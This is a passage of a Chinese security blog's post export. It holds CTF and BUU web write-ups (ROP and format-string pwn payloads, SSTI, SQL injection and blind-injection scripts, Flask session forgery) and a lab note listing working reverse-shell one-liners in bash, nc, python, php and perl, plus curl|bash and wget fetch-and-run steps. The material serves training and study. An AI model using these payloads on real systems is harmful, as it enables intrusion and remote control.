libc=ELF(\"/lib/x86_64-linux-gnu/libc.so.6\") offset=write_addr-libc.symbols[\"write\"] sys_addr=offset+libc.symbols[\"system\"] bin_addr=offset+next(libc.search(b\"/bin/sh\"))payload2 = cyclic(0x80+8) + p64(pop_rdi_addr) + p64(bin_addr) + p64(sys_addr)p.sendline(payload2) p.interactive() 格式化字符串fmtstr1还是比较简单的 思路：将x的地址放到栈上，对应的获取栈上的地址相对于printf的第几个参数 12345678from pwn import * conn=process('./fmtstr1')e=ELF('./fmtstr1')x_addr=0x0804A02C payload=p32(x_addr) + b\"%11$n\"conn.sendline(payload)conn.interactive() fmstr2这题很奇怪 X64 感觉是爆破出来的 1%9$s","categories":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/categories/PWN/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/tags/PWN/"}]},{"title":"CUMT2020华为杯","slug":"CUMT2020华为杯","date":"2020-10-24T09:53:38.000Z","updated":"2020-11-20T14:18:17.449Z","comments":true,"path":"2020/10/24/CUMT2020华为杯/","link":"","permalink":"https://pz1o.top/2020/10/24/CUMT2020%E5%8D%8E%E4%B8%BA%E6%9D%AF/","excerpt":"","text":"CUMT华为杯web狗活成了各方向签到手… webbabyflask模板注入 1&#x2F;name&#x3D;&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(40)(%27&#x2F;flag%27).read()&#125;&#125; dogef12摇奖得flag rehello_world异或 1234567891011121314d=[]b = \"is_easy_right?\"a = ['2A', '26', '12', '31', '1A', '7', '11', '3A', '2D', '0F', '0E','1A', '41', '4B', '36', '43', '31', '0', '3E', '16', '17', '35','1D', '10', '38', '11', '44', '4A', '1B', '2C', '2B', '17','50','3', '4']for x in a: c = '' z = x c += '0x' c +=z d.append(c)d = 0for i in range(0,35): c = int(a[i],16) m = i%14 print(chr(ord((b[m]))^c),end='') non_name四元一次方程 12345678b = [12, 32, 34, 12, 53, 1, 2, 4, 6, 8, 34, 45, 56, 32, 85, 43]c = ['a','b','c','d']for i in range(0,4): sum1 = 0 for j in range(0,4): print(\"%s*%s\"%(b[i*4+j],c[j]),end='+') print('\\n')#116 103 102 114 cryptoClassical维吉尼亚密码，上网down脚本，猜密钥，跑出来 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455cipher = \"Elxyi lrw fqfjyxl pr wixx yajy chb qtsk lqfjzrx zs xuua vafe chb nfsl pcgy es ipgv tzxo ywzq rvyc djxcfx lrw oyr tzxo ytc vxhp! Orwto pmlx rvy hafm vh icitt;kz wzxtx dzy phre tg zq;uj hlta czu otpm yz fx,iinamlg rtf ltci zndr qgj wmyl eyd ggg vmlrvl xz dg tne ysi momygk rqn blrm as oo.Eta rtf ltci pngnia mltiprpsk mq ffvi rvy dwwxv,xszyzo xciseu mt xedl czu kmthsr,igvyrh khtkth xh ripp qhw azxeg,lrzuya jhup xh teve qhw afatr? Hphaql rny jsnywplx bp hysikz’wsowl.Ky dzy yliw tztv by sykaw jom,bv iwzftipj hmkvl ysi halpr hxtlty, xhv.Xse ztrinpwm vj aeginx izr’m uineklcknwc ahzp tzx dxxe sy lzprqmjbsr;xalc uukm otpp xal qzsl hh xapvraltny mjty nsflw llggi mmpmk dej.Hsirbspwl smps xht mmzwx dlz cjr,vatdi pos sujm, vatdi pos sanx uxfcgalh,lnv mjhxp aav llvw mtbjo,jhy sylq mjxd neg htarwvktyp xal mxpgkvtsni hm tpoheg.pmz ltci eomvjxi elxpv winxu.Etgi ulktnk pkmm l wfppp,gjhyl btxa h otsk tpw jyhl dmeh s mgtw.Elx ivtgzmgly qymbvp waen tqherz fp bslgw ty e yvvrolmgg ulwm, fsf csg’v zt zr plpw if ekyjfrmpp jom egm lz sy fsfr htum klmebvps sgf ajlvmhgsek.Tpw ny xal iyd, A to zqlh mv xpld rqn ysi VBQECLY kl JynhfXseNbixspvxJmahwk.Dr ysi phc, ceexoujc xh bwp bjtexx miyvvp smuobyemgn.\"# coding: utf-8def encrypt(message, key): cipher = '' j = 0 for i in range(len(message)): if key[j % len(key)].islower(): offset = ord(key[j % len(key)]) - ord('a') else: if key[j % len(key)].isupper(): offset = ord(key[j % len(key)]) - ord('A') else: offset = ord(key[j % len(key)]) - 48 j += 1 if message[i].isalpha(): if message[i].islower(): cipher += chr((ord(message[i]) - ord('a') + offset) % 26 + ord('a')) else: cipher += chr((ord(message[i]) - ord('A') + offset) % 26 + ord('A')) else: cipher += message[i] j -= 1 return cipherdef decrypt(cipher, key): explain = '' j = 0 for i in range(len(cipher)): if key[j % len(key)].islower(): offset = ord(key[j % len(key)]) - ord('a') else: if key[j % len(key)].isupper(): offset = ord(key[j % len(key)]) - ord('A') else: offset = ord(key[j % len(key)]) - 48 j += 1 if cipher[i].isalpha(): if cipher[i].islower(): explain += chr((ord(cipher[i]) - ord('a') - offset) % 26 + ord('a')) else: explain += chr((ord(cipher[i]) - ord('A') - offset) % 26 + ord('A')) else: explain += cipher[i] j -= 1 return explainprint(decrypt(cipher,'Lethelastctf'))CUMTCTF&#123;EnjoyTheVigenereCipher&#125; ezRSA大数e 可以判断是wiener attack 上网直接down脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071&#39;&#39;&#39;Created on Dec 14, 2011@author: pablocelayes&#39;&#39;&#39;import ContinuedFractions, Arithmetic, RSAvulnerableKeyGeneratordef hack_RSA(e,n): &#39;&#39;&#39; Finds d knowing (e,n) applying the Wiener continued fraction attack &#39;&#39;&#39; frac &#x3D; ContinuedFractions.rational_to_contfrac(e, n) convergents &#x3D; ContinuedFractions.convergents_from_contfrac(frac) for (k,d) in convergents: #check if d is actually the key if k!&#x3D;0 and (e*d-1)%k &#x3D;&#x3D; 0: phi &#x3D; (e*d-1)&#x2F;&#x2F;k s &#x3D; n - phi + 1 # check if the equation x^2 - s*x + n &#x3D; 0 # has integer roots discr &#x3D; s*s - 4*n if(discr&gt;&#x3D;0): t &#x3D; Arithmetic.is_perfect_square(discr) if t!&#x3D;-1 and (s+t)%2&#x3D;&#x3D;0: print(&quot;Hacked!&quot;) return d# TEST functionsdef test_hack_RSA(): print(&quot;Testing Wiener Attack&quot;) times &#x3D; 5 while(times&gt;0): e,n,d &#x3D; RSAvulnerableKeyGenerator.generateKeys(1024) print(&quot;(e,n) is (&quot;, e, &quot;, &quot;, n, &quot;)&quot;) print(&quot;d &#x3D; &quot;, d) hacked_d &#x3D; hack_RSA(e, n) if d &#x3D;&#x3D; hacked_d: print(&quot;Hack WORKED!&quot;) else: print(&quot;Hack FAILED&quot;) print(&quot;d &#x3D; &quot;, d, &quot;, hacked_d &#x3D; &quot;, hacked_d) print(&quot;-------------------------&quot;) times -&#x3D; 1 if __name__ &#x3D;&#x3D; &quot;__main__&quot;: n &#x3D; 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597 e &#x3D; 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619 c &#x3D; 235079473042454099807116076488262740135383858230967099540307826273199444131724945298259060669497025680602868465015609167157760611830665379910856647739895018654389167886359502125262006498872925841789249028759026079722290718145036644959479543255350040619949567107916725017078853648984759794085772688267388901151 #test_is_perfect_square() d &#x3D; 8264667972294275017293339772371783322168822149471976834221082393409363691895 m &#x3D; pow(c,d,n) def num2str(num): tmp &#x3D; hex(num)[2:].replace(&quot;L&quot;,&quot;&quot;) if(len(tmp))%2 &#x3D;&#x3D;0: return tmp.decode(&quot;hex&quot;) else: return (&quot;0&quot;+tmp).decode(&quot;hex&quot;) print(num2str(m)) #print(&quot;-------------------------&quot;) #print(hack_RSA(e,n))CUMTCTF&#123;1bc205a110e6643137e045b8268b4ace&#125; miscSign In转base64在转brainfk 1CUMTCTF&#123;Welcome_to_CUMTCTF_2020_Final&#125; 出个流量分析吧http流base64解码 1flag&#123;WirRSharK_S0_E45y&#125; 出个LSB吧LSB隐写 red green blue 0 0 0 保存得二维码 扫得flag 1cumtctf&#123;1sb_i4_s0_Ea4y&#125; 出个伪web吧查看最新修改文件的时间 可以看到pass中有明显字符串cumt 然后拿flag包裹就行 出个文档吧隐藏文字 内存取证12python vol.py -f memory.img imageinfopython vol.py -f memory.img --profile=Win2003SP0x86 filescan |grep flag 可以看到有flag.png，输出一下 1python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 dumpfiles -D .&#x2F; -Q 0x000000000484f900 可以看到一个图片扫一下 1jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D; 解不出来 查看系统窗口列表，看有没有和flag有关的程序 1python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 windows | grep flag 可以看到有一个程序dump一下 1python vol.py -f memory.img --profile&#x3D;Win2003SP1x86 memdump -D .&#x2F; -p 1992 用foremost分离一下 可以看到有图片 有key值和vi 然后就是AES加密 12345key:Th1s_1s_K3y00000vi:1234567890123456base64:jfXvUoypb8p3zvmPks8kJ5Kt0vmEw0xUZyRGOicraY4&#x3D;flag&#123;F0uNd_s0m3th1ng_1n_M3mory&#125; 出个压缩包吧010打开之后发现有secret.png没有伪加密，很明显子块被修改 7a改成74 分离出secret.png 发现是一张图片，但有两帧 脱到steg里面可以看到两个残缺的二维码 补全，就可以看到flag 1flag&#123;yanji4n_bu_we1shi&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/tags/CTF/"},{"name":"题解","slug":"题解","permalink":"https://pz1o.top/tags/%E9%A2%98%E8%A7%A3/"}]},{"title":"反弹shell总结","slug":"反弹shell总结","date":"2020-10-03T05:45:01.000Z","updated":"2020-11-20T14:19:35.452Z","comments":true,"path":"2020/10/03/反弹shell总结/","link":"","permalink":"https://pz1o.top/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/","excerpt":"","text":"前言最近遇到反弹shell，总结一下反弹shell，用来做笔记 反弹shell反向Shell指Shell回弹或者叫反射，就是说受害者kali把自己的Shell挂载（或者叫attach更合适）到某个端口上，以此暴露到攻击者win可以连接的位置，攻击者win通过连接该端口最终拿到shell。 以下实验都为 kali为被攻击者来模仿服务器 win为攻击者 kali（服务端）：192.168.202.129 win（客户端）：169.254.158.23 bash反弹shell1bash -i &gt;&amp; /dev/tcp/169.254.158.23/8080 0&gt;&amp;1 bash产生了一个交互环境让本地主机主动发起与目标主机8080端口建立的连接（即TCP 8080 会话连接）相结合，然后在重定向个tcp 8080会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash 反弹环境。 实验首先在win上监听8080端口 1nc -nvlp 8080 -n: 不反向解析dns，即不通过ip解析域名 no dns -v: 详细信息输出 verbose -l: 监听 listen -p: 指定端口 port 然后再kali上运行 1bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;169.254.158.23&#x2F;8080 0&gt;&amp;1 之后反弹成功 解释具体各参数的意义 linux文件描述符 1230 - stdin 代表标准输入,使用&lt;或&lt;&lt;1 - stdout 代表标准输出,使用&gt;或&gt;&gt;2 - stderr 代表标准错误输出,使用2&gt;或2&gt;&gt; >&amp; 1234567891011当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向至文件。当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向至后面的文件描述符&gt;&amp;和&gt;的区别root@kali:/var/www/html# ls //查看无1.phpflag.php index.phproot@kali:/var/www/html# cat 1.php 2&gt;1 //将错误内容输入到1文件中root@kali:/var/www/html# cat 1cat: 1.php: 没有那个文件或目录root@kali:/var/www/html# cat 1.php 2&gt;&amp;1 //将错误内容按标准输出出来cat: 1.php: 没有那个文件或目录 bash -i 产生一个bash环境 /dev/tcp/ip/port： /dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接，&gt;&amp;后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出。 0&gt;&amp;1，代表将标准输入重定向到标准输出，这里的标准输出已经重定向到了/dev/tcp/ip/port这个文件，也就是远程，那么标准输入也就重定向到了远程，这样的话就可以直接在远程输入了 nc一句话反弹1nc 169.254.158.23 7777 -e &#x2F;bin&#x2F;bash -e: 指定nc连接成功后执行的程序 无-e的情况下可以执行 1rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 169.254.158.23 7777 &gt;&#x2F;tmp&#x2F;f; 实验1首先在win（客户端）上监听7777端口 1nc -nvlp 7777 然后在kali（服务端）上一句话反弹 1nc 169.254.158.23 7777 -e &#x2F;bin&#x2F;bash 反弹成功 实验2win上监听端口 1nc -nvlp 7777 kali上执行 1rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 169.254.158.23 7777 &gt;&#x2F;tmp&#x2F;f; 反弹成功 curl反弹前提要利用bash一句话的情况下使用curl反弹shell kali上index文件上含有bash一句话，就可以反弹shell。 实验kali（服务端）上检查是否有bash一句话 123curl 192.168.202.129bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;169.254.158.23&#x2F;7777 0&gt;&amp;1 在win（客户端）上监听端口 1nc -nvlp 7777 利用服务端curl反弹 1curl 192.168.202.129|bash 反弹成功 wget反弹其实是利用wget和php脚本一块执行达到反弹 实验首先在win（应该在任何一台服务器上也行）上有shell.txt，写入以下php内容 1234&lt;?php$sock=fsockopen(\"localhost\",12345);//localhost为自己的ipexec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");?&gt; 先在win（客户端）上监听 1nc -nvlp 7777 在kali（服务端）上利用wget下载shell.txt，然后执行php 1wget 169.254.158.23:8888&#x2F;shell.txt -O &#x2F;tmp&#x2F;x.php &amp;&amp; php &#x2F;tmp&#x2F;x.php 反弹成功 python反弹利用curl 但这次用的是py脚本 123456789#!/usr/bin/python#-*- coding: utf-8 -*-import socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((\"169.254.158.23\",7777)) #更改localhost为自己的ip,端口任意os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([\"/bin/sh\",\"-i\"]) 当然也可以直接执行 1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"169.254.158.23\",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);' 效果是一样的 实验1首先在kali（服务端）上写下py脚本 123456789#!/usr/bin/python#-*- coding: utf-8 -*-import socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((\"169.254.158.23\",7777)) #更改localhost为自己的ip,端口任意os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([\"/bin/sh\",\"-i\"]) win（客户端）监听 1nc -nvlp 7777 kali（服务端）curl 1curl 192.168.202.129/shell.py|python 反弹成功 实验2在win（客户端）监听端口 1nc -nvlp 7777 在kali（服务端）输入 1python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;169.254.158.23&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39; 反弹成功 php反弹和python一样利用curl php脚本如下，和上面的shell.txt一样的 1234&lt;?php$sock=fsockopen(\"169.254.158.23\",7777);//localhost为自己的ip，端口任意exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");?&gt; 也可以执行 1php -r '$sock=fsockopen(\"169.254.158.23\",7777);exec(\"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' 实验1首先在kali（服务端）写下php脚本，存为shell.txt 1234&lt;?php$sock=fsockopen(\"169.254.158.23\",7777);//localhost为自己的ip，端口任意exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");?&gt; 在win（客户端）监听端口 1nc -nvlp 7777 kali（服务端）curl反弹 1curl 192.168.202.129/shell.txt|php 反弹成功 实验2win上监听端口 1nc -nvlp 7777 kali上执行 1php -r '$sock=fsockopen(\"169.254.158.23\",7777);exec(\"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' 反弹成功 perl反弹和上面几个反弹一样 这里只做一下演示 1perl -e 'use Socket;$i=\"169.254.158.23\";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;; 实验在win上监听端口 在kali上执行 1perl -e 'use Socket;$i=\"169.254.158.23\";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;; 反弹成功 总结以上都是最基本的反弹shell 其实反弹shell还是很灵活的，具体什么样的场景下怎么用还需要自己判断","categories":[{"name":"笔记","slug":"笔记","permalink":"https://pz1o.top/categories/%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/tags/CTF/"},{"name":"反弹shell","slug":"反弹shell","permalink":"https://pz1o.top/tags/%E5%8F%8D%E5%BC%B9shell/"},{"name":"总结","slug":"总结","permalink":"https://pz1o.top/tags/%E6%80%BB%E7%BB%93/"}]},{"title":"BUU刷题(Web)","slug":"BUU刷题","date":"2020-09-27T15:15:28.000Z","updated":"2020-11-20T14:18:05.259Z","comments":true,"path":"2020/09/27/BUU刷题/","link":"","permalink":"https://pz1o.top/2020/09/27/BUU%E5%88%B7%E9%A2%98/","excerpt":"","text":"BUU(Web)前言其实自己会做完题写一些wp，但奈何自己三天摸鱼两天休息，所以上传上来监督自己学习 顺便分一下类 SQL注入[强网杯 2019]随便注（堆叠注入） 堆叠注入： 分号（；）来表示一条sql语句的结束。结束一个sql语句再继续构造下一条语句，可以一起执行。堆叠注入可以执行的是任意的语句。 先来了解一下堆叠注入 1231&#39; #1&#39; order by 2#1&#39; union select 1,2# 可以看到过滤了大多数语句，但我们还有show，alert，rename，desc等 通过看表可以看见两个表 11&#39;;desc words;# words表 11&#39;;desc &#96;1919810931114514&#96;;# &#x2F;&#x2F;在mysql中数字型需要&#96;&#96; 此时，我们就找见了flag，但问题是怎么拿出flag呢？ 下面操作是骚姿势： 主要思想是利用回显位置来倒退获取flag，回显肯定是id到words表里面找数据，然后回显，那么我们在查询语句不变的前提下，将flag回显出来？ 把words表改名，把数字表改为words； 往新words表里面插入一个id参数，这样回显就可以找到id，从而显示出flag 1select id,data from words where id&#x3D;&#39;id&#39;; 所以flag还得改成data 最终payload 11&#39;;rename table words to word1;rename table &#96;1919810931114514&#96; to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);# 复习一下mysql操作 123456#表重命名rename table o_name to n_name;#新增字段alert table table_name add column_name [type];#修改字段名alert table table_name change o_name n_name [type]; [SUCTF 2019]EasySQL（堆叠注入）过滤了很多东西，但依然可以堆叠注入 找到Flag表 之后就不会做了… 12select 1;set sql_mode&#x3D;pipes_as_concat;select 1||flag from Flag; 补充系统变量@@sql_mode：是一组mysql支持的基本语法及校验规则PIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符，也和字符串的拼接函数Concat相类似 原本||是or的意思，这里拼接之后： [极客大挑战 2019]EasySQL直接万能密码登录 1admin&#39; or 1&#x3D;1 %23&amp;password&#x3D;1&#39; or 1&#x3D;1%23 [极客大挑战 2019]LoveSQL简单的sql注入 直接union注入 1231&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())#1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;geekuser&quot;),(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;l0ve1ysq1&quot;)#1&#39; union select 1,(select group_concat(password) from geekuser),(select group_concat(password) from l0ve1ysq1)# [极客大挑战 2019]BabySQL（过滤关键字）双写绕过 查关键字可以先select语句观察哪些被过滤了。 其中关键字有select，union，or（包括information,password），from，where， 12345671&#39; ununionion selselectect 1,(selselectect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;database()),3 #&#x2F;&#x2F;b4bsql,geekuser1&#39; ununionion selselectect 1,(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;b4bsql&#39;),(selselectect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name&#x3D;&#39;geekuser&#39;) #&#x2F;&#x2F;id username password&#x2F;&#x2F;id username password1&#39; ununionion selselectect 1,(selselectect group_concat(username,passwoorrd) frfromom b4bsql),(selselectect group_concat(username,passwoorrd) frfromom geekuser) #flag&#123;1745650a-3c83-4068-a316-f2604dc9e366&#125; [CISCN2019 华北赛区 Day2 Web1]Hack World（过滤关键字和空格的盲注）简单测试了一下 发现空格被过滤了，union、and、or也被过滤了，并且发现列有两列，报错只出bool，于是就想到是不是盲注，但首要问题是怎么绕过空格 以下有几种绕空格的办法 /**/ （） %0a `` tab 这里我们用（）来绕过，接下来就是写脚本 1234567891011121314import requestsdic ='''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''url = \"http://fb5af086-8bde-4cdd-8d2e-fcc9fdbe523a.node3.buuoj.cn/index.php\"flag = ''for i in range(0,50): for j in dic: payload = \"if((mid((select(flag)from(flag)),&#123;0&#125;,1)='&#123;1&#125;'),1,2)\".format(i,j) data = &#123;\"id\": payload,&#125; r = requests.post(url=url,data=data) if \"Hello\" in r.text: print(payload) flag += j break print(flag) 12拿到flagflag&#123;3ba1b350-3474-44d2-a3cd-52f61aaeca64&#125; 但我自己写的脚本很诡异，无法检测到-，只能通过payload倒推 所以又换了一个写了一下,用ascii字符来判断 1234567891011121314import requestsdic ='''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''url = \"http://fb5af086-8bde-4cdd-8d2e-fcc9fdbe523a.node3.buuoj.cn/index.php\"flag = ''for i in range(1,50): for j in range(32,128): payload = \"if(ascii(mid((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,2)\".format(i,j); data = &#123;\"id\": payload,&#125; r = requests.post(url=url,data=data) if \"Hello\" in r.text: print(payload) flag += str(chr(j)) break print(flag) 刚写脚本，对其中原理还不是很熟悉，希望后续能深入学习py 代码审计[极客大挑战 2019]Havefun直接看源码 拿flag 1cat&#x3D;dog [极客大挑战 2019]BuyFlag主要说一下两个函数 strcmp() strcmp()函数只有在相等的情况下返回0。那么我们传入一个数组，它会返回NULL，而判断使用了== ，而NULL==0是bool(true)，这样就成功绕过。 is_numeric() is_numeric() 判断变量是否为数字或数字字符串，不仅检查10进制，16进制也可以。is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后。所以，查看函数发现该函数对于第一个空格字符会跳过空格字符判断，接着后面的判断！该函数还可能造成sql注入，例如将‘1 or 1’转换为16进制形式，再传参，就可以造成sql注入 之后就是改cookie，post进password和money 这里判断money相等用的是strcmp()所以我们可以用数组绕过 [BJDCTF2020]Easy MD5（ffifdyop）发了几个数字后没发现什么东西，然后抓包，看见hint 1select * from &#39;admin&#39; where password&#x3D;md5($pass,true) 这里想要绕过的话肯定是找万能密码 1password&#x3D;&#39;&#39; or &#39;123&#39; 这里的话用的是ffifdyopMD5加密后为 1&#39;or&#39;6É]™é!r,ùíb\u001c 符合万能密码 进入下一关 源码如下 12345$a &#x3D; $GET[&#39;a&#39;];$b &#x3D; $_GET[&#39;b&#39;];if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123; &#x2F;&#x2F; wow, glzjin wants a girl friend. 这个可以拿数组过，也可以找一些特殊的如 123456QNKCDZO240610708s878926199as155964671as214587387as214587387a 他们的MD5都是0 最后一关源码 123456789 &lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST[&#39;param1&#39;]!&#x3D;&#x3D;$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;param2&#39;]))&#123; echo $flag;&#125; 直接拿数组绕过就好 开发[护网杯 2018]easy_tornado学习一下tornado https://blog.csdn.net/belalds/article/details/80575755 1234567891011121314151617# coding:utf-8 import tornado.webimport tornado.ioloop class IndexHandler(tornado.web.RequestHandler): \"\"\"主路由处理类\"\"\" def get(self): \"\"\"对应http的get请求方式\"\"\" self.write(\"Hello Itcast!\") if __name__ == \"__main__\": app = tornado.web.Application([ (r\"/\", IndexHandler), ]) app.listen(8000) tornado.ioloop.IOLoop.current().start() tornado.web tornado的基础web框架模块 RequestHandler 封装了对应一个请求的所有信息和方法，write(响应信息)就是写响应信息的一个方法；对应每一种http请求方式（get、post等），把对应的处理逻辑写进同名的成员方法中（如对应get请求方式，就将对应的处理逻辑写在get()方法中），当没有对应请求方式的成员方法时，会返回“405: Method Not Allowed”错误。 1234567891011121314151617# coding:utf-8 import tornado.webimport tornado.ioloop class IndexHandler(tornado.web.RequestHandler): \"\"\"主路由处理类\"\"\" def post(self): # 我们修改了这里 \"\"\"对应http的post请求方式\"\"\" self.write(\"Hello Itcast!\") if __name__ == \"__main__\": app = tornado.web.Application([ (r\"/\", IndexHandler), ]) app.listen(8000) tornado.ioloop.IOLoop.current().start() Application Tornado Web框架的核心应用类，是与服务器对接的接口，里面保存了路由信息表，其初始化接收的第一个参数就是一个路由信息映射元组的列表；其listen(端口)方法用来创建一个http服务器实例，并绑定到给定端口（注意：此时服务器并未开启监听）。 总结Tornado Web程序编写思路 创建web应用实例对象，第一个初始化参数为路由映射列表。 定义实现路由映射列表中的handler类。 创建服务器实例，绑定服务器端口。 启动当前线程的IOLoop。 [HCTF 2018]admin（flask中session伪造）发现只能admin才能登录获取flag 主要学习一下flask中的session伪造 session一般存储在服务器，而在flask中，session是存储在客户端，并且flask中对数据仅仅进行了签名，签名主要目的是防止篡改，但却无法防止被读取。所以就会产生一些安全问题。 在这个题中，我们就可以根据这个来解题 先来看一下自己注册用户test的cookie，之后进行解码，可以参考p牛的脚本，也可以上github上找flask-session-manager之后done下来 我这里用的是python2.7 解密:python flask_session_manager2.py decode -c -s # -c是flask cookie里的session值 -s参数是SECRET_KEY 加密:python flask_session_manager2.py encode -s -t # -s参数是SECRET_KEY -t参数是session的参照格式，也就是session解密后的格式 12.eJw9kEGPgjAQhf_KZs4eBJcLiZdNkUjSIZBKM70Y10VKS90EMCjG_77VTbxN8mbe-97cYX_q60FDPPaXegH79gfiO3x8Qwzc8WUuN45kaXLRGWSVphC1Mk2Uy6ojWYRosg7DTYuzNmi0Ib_HjXY8pJWS6Ge6cZlc8zQJlKlabjLHWWn5vHFcFCtMdzeabcRd5hTbTWjsFV0RkdtFitlJCZ_FmiuZUpOgT5KVU6IIFPM8YRKQ0JYLWsNjAcehP-3HX1uf3xWQFQGm2-l5ygW2Sm5DlVYdTynC2WN4TBJf3RORRGbRHG-qWb_sWndo6rdTmWSzmP6V88F5AcZ6GGEBl6HuX2-DYAmPP9bObbw.X1R2Pw.c_FhTL4z1ufpRuGX5k2__AoFhBU&#123;u&#39;csrf_token&#39;: &#39;4454b0a6813beb6dee0f974d3f7a0e1a1a2d672f&#39;, u&#39;user_id&#39;: u&#39;10&#39;, u&#39;name&#39;: u&#39;test&#39;, u&#39;image&#39;: &#39;DBsO&#39;, u&#39;_fresh&#39;: True, u&#39;_id&#39;: &#39;2c49afadc99c45accaf899eead662e7ab78c68ca9c28f3f7ecc2621a18a5f5b22f04d31f1474e2c992bfd506916d9be9d90e89881b4aa68aefe45d9c7a5a8d16&#39;&#125; 1.eJw9kE-LwjAQxb_KMmcPtm4vgpcltVjIlJbYMLmIf2rTpHGhVVorfveNLngbeDPv_d48YHfuql7D8trdqhnsmhMsH_B1gCVwx-eZXDuShclEa5CVmkLUytRRJsuWZB6iSVsM1w1O2qDRhvweN9rxkBZKop_pzmU8ZkkcKFM23KSOs8Lyae24yBeYbO802Yi71Cm2HdDYEV0ekdtGitlBCZ_F6pFMoUnQN8nSKZEHinmeMA5IaMsFreA5g2PfnXfXX1tdPhWQ5QEmm-F1ygU2Sm5ClZQtTyjCyWN4TBI_7QuRRGrRHO-qXr3tGrevq49TEaeTGP6Vy955AfYn11xgBre-6t5_g2AOzz9EfG4F.X1R5Og.sdx02y47Ad8Rck93GVBwZ0RVTOs 